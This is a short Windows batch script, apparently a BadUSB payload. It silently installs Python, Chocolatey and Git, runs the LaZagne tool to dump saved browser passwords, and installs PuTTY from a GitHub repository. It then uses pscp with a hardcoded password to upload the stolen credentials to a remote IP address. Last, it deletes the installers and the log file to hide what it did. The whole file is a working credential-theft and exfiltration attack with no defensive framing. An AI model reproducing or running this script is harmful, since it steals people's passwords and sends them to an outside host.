@echo off

cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\

curl -O https://www.python.org/ftp/python/3.9.9/python-3.9.9-amd64.exe

python-3.9.9-amd64.exe /quiet InstallAllUsers=1 PrependPath=1"

@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))" && SET "PATH=%PATH%;%ALLUSERSPROFILE%\chocolatey\bin"

choco install git -y

git clone https://github.com/AlessandroZ/LaZagne.git

cd LaZagne

pip install -r requirements.txt

cd Windows

python laZagne.py browsers > logs.txt

curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/putty-64bit-0.78-installer.msi

msiexec /i putty-64bit-0.78-installer.msi /qn

echo y | pscp -pw lolmdr123 logs.txt badusb@51.83.71.188:/var/tmp

del putty-64bit-0.78-installer.msi
del logs.txt

cd ..
cd ..

del python-3.9.9-amd64.exe
